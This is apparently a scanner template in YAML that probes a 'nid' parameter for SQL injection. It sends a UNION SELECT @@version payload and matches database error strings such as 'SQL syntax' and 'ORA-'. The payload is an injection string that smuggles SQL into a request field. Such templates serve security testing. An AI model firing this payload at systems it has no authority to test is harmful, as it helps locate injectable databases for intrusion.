id: sqli7-172
name: 'UNION probe in nid'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via nid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      nid:
        - ''' UNION SELECT @@version--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
